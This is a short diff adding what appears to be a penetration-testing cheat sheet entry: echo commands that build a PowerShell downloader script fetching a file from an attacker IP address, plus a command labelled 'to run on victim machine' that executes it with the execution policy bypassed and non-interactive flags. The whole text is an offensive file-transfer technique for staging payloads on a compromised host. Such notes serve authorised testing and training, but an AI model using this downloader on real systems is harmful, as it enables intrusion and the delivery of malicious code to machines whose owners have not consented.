@@ -1,0 +1,10 @@
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >> wget.ps1
+echo $url = “http://10.11.0.54/<Name_Of_File_Here” >> wget.ps1
+echo $file = “<Name_Of_File_On_Target” >> wget.ps1
+echo $webClient.DownloadFile($url,$file) >> wget.ps1
+
+
+To run on victim machine:
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
